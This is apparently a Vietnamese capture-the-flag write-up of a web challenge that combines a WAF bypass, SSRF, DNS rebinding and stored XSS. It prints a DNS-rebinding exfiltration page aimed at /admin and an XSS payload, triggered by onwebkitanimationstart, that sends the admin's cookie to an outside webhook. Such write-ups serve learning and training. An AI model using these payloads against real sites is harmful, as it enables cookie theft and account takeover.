

---
Tài liệu/Bài báo tham khảo:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://hacktricks.wiki/ja/pentesting-web/xss-cross-site-scripting/xss-information-exfiltration-payload.html

https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html

https://developer.chrome.com/blog/private-network-access-update-2024-03

https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks


---

Mình thấy bài tập có cung cấp các từ khóa bị chặn bởi WAF:
![Pasted image 20261101135531](Attachments/Pasted%20image%2020261101135531.png)


Do đó việc đầu tiên của mình làm là mình đã viết một script nho nhỏ để tìm xem tag/event nào ko bị chặn bằng cách copy tất cả tag/event trong XSS Cheat Sheet của PorrtSwigger:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
![Pasted image 20261017212603](Attachments/Pasted%20image%2020261017212603.png)

Result:
```
Event bypass:
['onbeforematch', 'onbeforepaste', 'oncancel', 'oncommand', 'oncontentvisibilityautostatechange', 'oncontentvisibilityautostatechange(hidden)', 'ondragexit', 'onfocus(autofocus)', 'onformdata', 'ongesturechange', 'ongestureend', 'ongesturestart', 'ongotpointercapture', 'onloadstart', 'onlocation', 'onlostpointercapture', 'onpagereveal', 'onpageswap', 'onpointercancel', 'onpromptaction', 'onpromptdismiss', 'onscrollsnapchange', 'onscrollsnapchanging', 'onsecuritypolicyviolation', 'onslotchange', 'onstream', 'onsuspend', 'ontoggle(popover)', 'ontouchcancel', 'onvalidationstatuschange', 'onwaiting', 'onwaiting(loop)', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitmouseforcechanged', 'onwebkitmouseforcedown', 'onwebkitmouseforceup', 'onwebkitmouseforcewillbegin', 'onwebkitneedkey', 'onwebkitplaybacktargetavailabilitychanged', 'onwebkitpresentationmodechanged', 'onwebkittransitionend', 'onwebkitwillrevealbottom']
----------
Tag bypass:
['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
```
/feature không tồn tại:
![Pasted image 20261101140958](Attachments/Pasted%20image%2020261101140958.png)

/admin bị 403:
![Pasted image 20261101141011](Attachments/Pasted%20image%2020261101141011.png)


Nhưng test một lúc thì mình thấy vô lý cực kì :)) Sao <> đều bị escape hết rồi thì XSS đường nào được ?? Khó hiểu. Nên mình đặt ra nghi vấn chắc là Challenge này đang troll troll, ko thể có XSS được:
![Pasted image 20261017213006](Attachments/Pasted%20image%2020261017213006.png)

![Pasted image 20261017214628](Attachments/Pasted%20image%2020261017214628.png)
![Pasted image 20261017214703](Attachments/Pasted%20image%2020261017214703.png)

![Pasted image 20261017214712](Attachments/Pasted%20image%2020261017214712.png)


Sau đó mình test thêm thì thấy endpoint gửi report cho admin khá thú vị:
![Pasted image 20261101135941](Attachments/Pasted%20image%2020261101135941.png)

Nó nhận link trực tiếp ở local luôn, mình thử đổi bằng link webhook của mình thì vẫn nhận được request khá ảo :)) Nên mình nghĩ đến hướng SSRF:
![Pasted image 20261101140259](Attachments/Pasted%20image%2020261101140259.png)
![Pasted image 20261101140617](Attachments/Pasted%20image%2020261101140617.png)

Trước hết thì mình thử các protocol đặc biệt như file://
Mình ko biết có hoạt động không do chỉ hiện status ok ;-; Ko có gì đặc biệt nên tạm thời mình thử cách khác.

Lúc này mình đọc được một method khá hay trên hacktricks là DNS Rebinding, mình thấy hợp với challenge vì định hướng lúc này của mình đang là redirect bot đến server mình kiếm soát, sau đó có thể CSRF để admin thực hiện hành vi gì đó ở trang /admin. Vấn đề là mình chưa biết /admin có các nội dung gì ;-;
Mình đã thử thêm một số header tùy chỉnh như kiểu X-Forwarded-For: 127.0.0.1, X-Host-Ip: 127.0.0.1,... đổi referer thành 127.0.0.1:9090... nhưng mọi cách đều không đánh lừa được server.

Thế thì mình mới tiến hành tấn công thử theo hướng DNS Rebinding. Mình dựng VPS, sau đó viết payload CSRF dạng:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <script>
        const REBIND_URL = 'http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/admin';
        const EXFIL_DOMAIN = 'http://5dfrew66.requestrepo.com';

        new Image().src = `${EXFIL_DOMAIN}/log?status=page_loaded`;

        setTimeout(function() {
            fetch(REBIND_URL)
                .then(res => res.text())
                .then(text => {
                    new Image().src = `${EXFIL_DOMAIN}/log?data=` + encodeURIComponent(text);
                })
                .catch(e => {
                    new Image().src = `${EXFIL_DOMAIN}/log?error=fetch_blocked`;
                });
            new Image().src = REBIND_URL;
        }, 1000);
    </script>
</body>
</html>
```
Host trên VPS của mình. Cơ chế thì nó khá đơn giản, Bot vào trang:
http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/
mà mình gửi. Lúc này DNS trả về ip VPS của mình, bot load được trang trên server mình.
Đoạn mã Javascript trên server của mình liên tục fetch nội dung trang chính nó rồi gửi nội dung về RequestRepo (Trang bắt request tương tự webhook).

Bản chất cách này bypass được SOP vì khi TTL của bản ghi địa chỉ IP trả về từ http://make-104.64.219.249-rebindfor10safter2times-127.0.0.1-rr.1u.ms:9090/ thay đổi liên tục, mà trong mã Javascript của mình thì cứ 1s sẽ lại gửi về server nội dung trang. Nếu đúng lúc DNS trả về 127.0.0.1 thì ngon luôn, lúc này nó biến thành 127.0.0.1:9090/admin -> mình đọc được nội dung của /admin; do là SOP đối chiếu Host hiện tại với URL trong fetch() -> thấy giống (URL vẫn vậy, chỉ bản ghi IPv4 trả về là khác) nên thành công.
![[Attachments/Pasted image 20261101150452.png]]

Tưởng  vậy là đã xong nhưng mình test mãi mà ko hiểu sao chỉ xem được nội dung của chính trang được host trên VPS của mình. Khá cay cú 😠

Mình tìm hiểu ra thì biết trình duyệt hiện đại có cơ chế PNA (Private Network Access): https://developer.chrome.com/blog/private-network-access-update-2024-03 và DNS Pinning: https://security.stackexchange.com/questions/14038/does-dns-pinning-protect-against-all-dns-rebinding-attacks.
Mình thấy khó quá, không cách nào được thêm tiến bộ gì nữa nên tạm thời gác lại hướng này 😥

![Pasted image 20261101141502](Attachments/Pasted%20image%2020261101141502.png)

Thế là mình lại quay lại mò mẫm. Trong lúc tìm xem HTML có cái gì ko thì mình thấy một cái tuyệt vời và mình thấy ngay mấu chốt của bài tập ;))
Ảo tung chảo thật sự, có một checkbox trong form Submit có tên 'enable-html-rendering':
![Pasted image 20261101143651](Attachments/Pasted%20image%2020261101143651.png)

Má, checkbox này được tàng hình bởi CSS :))) troll troll thật, thế là mình thêm `&enable-html-rendering=on` ở cuối mỗi request submit gửi đi, kết quả là render được thật.

Lúc này thì mình mới thấy cái script mình viết lúc đầu có tác dụng:
```
Event bypass:
['onbeforematch', 'onbeforepaste', 'oncancel', 'oncommand', 'oncontentvisibilityautostatechange', 'oncontentvisibilityautostatechange(hidden)', 'ondragexit', 'onfocus(autofocus)', 'onformdata', 'ongesturechange', 'ongestureend', 'ongesturestart', 'ongotpointercapture', 'onloadstart', 'onlocation', 'onlostpointercapture', 'onpagereveal', 'onpageswap', 'onpointercancel', 'onpromptaction', 'onpromptdismiss', 'onscrollsnapchange', 'onscrollsnapchanging', 'onsecuritypolicyviolation', 'onslotchange', 'onstream', 'onsuspend', 'ontoggle(popover)', 'ontouchcancel', 'onvalidationstatuschange', 'onwaiting', 'onwaiting(loop)', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitmouseforcechanged', 'onwebkitmouseforcedown', 'onwebkitmouseforceup', 'onwebkitmouseforcewillbegin', 'onwebkitneedkey', 'onwebkitplaybacktargetavailabilitychanged', 'onwebkitpresentationmodechanged', 'onwebkittransitionend', 'onwebkitwillrevealbottom']
----------
Tag bypass:
['a', 'abbr', 'acronym', 'animate', 'animatemotion', 'animatetransform', 'area', 'article', 'aside', 'b', 'base', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'input', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'wbr', 'xmp', 'xss']
```

Mình chọn tag `<b>` làm vector tấn công sau đó sử dụng XSS cheat sheet của Port Swigger và dễ dàng craft ra một payload XSS lách qua các keyword bị cấm bởi WAF:

```html
<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
```
![Pasted image 20261101144137](Attachments/Pasted%20image%2020261101144137.png)
Ý tưởng dùng print() thay cho alert(1) mình cũng đọc trong một bài báo ở Port Swigger :D Do ở đây `alert` đã nằm trong keyword bị cấm: https://portswigger.net/research/alert-is-dead-long-live-print

```html
<style>@keyframes x{}</style>
<b style="animation-name:x" onwebkitanimationstart="fetch('https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/?c='+document.cookie)"></b>
```

![Pasted image 20261101145158](Attachments/Pasted%20image%2020261101145158.png)

Gửi cho Admin và mình dễ dàng có được Flag:
![Pasted image 20261101145327](Attachments/Pasted%20image%2020261101145327.png)
